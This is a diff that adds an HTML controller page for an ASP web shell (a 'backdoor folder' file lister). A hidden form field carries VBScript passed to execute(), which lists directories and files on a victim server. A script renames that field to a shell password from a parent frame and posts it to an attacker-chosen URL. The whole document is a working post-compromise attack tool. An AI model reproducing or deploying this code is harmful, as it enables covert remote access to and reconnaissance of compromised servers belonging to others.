@@ -1,0 +1,20 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">File List<br>
+. the backdoor folder<br>
+\ the web root folder</div>
+<form name="xform" method="post" target="_blank">
+  <table width="80%"  border="0">
+    <tr>
+      <td width="8%">Path:</td>
+      <td width="92%"><input name="path" type="text" value="c:\" size="50"></td>
+    </tr>
+  </table>
+<input type="hidden" name="code" value='execute("response.clear:tmp=request(""path""):if tmp=""."" then:tmp=Server.MapPath("".""):end if:if tmp=""\"" then:tmp=Server.MapPath(""\""):end if:StrResult=""List <b>""&tmp&""</b><br><table width=80% border=1><tr><td width=40%><b>Name</b></td><td width=20%><b>Size</b></td><td width=40%><b>ModifyTime</b></td></tr>"":Set FSO=CreateObject(""Scripting.FileSystemObject""):Set f=FSO.GetFolder(tmp):Set fc=f.SubFolders:For Each myfile in fc:StrResult=StrResult&""<tr><td>""&myfile.name&""</td><td>Dir</td><td>""&myfile.DateLastModified&""</td></tr>"":Next:Set fc2=f.files:For Each myfile in fc2:StrResult=StrResult&""<tr><td>""&myfile.name&""</td><td>""&myfile.Size&""</td><td>""&myfile.DateLastModified&""</td></tr>"":Next:StrResult=StrResult&""</tr>"":Set FSO=Nothing:response.write(StrResult):response.End")'>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
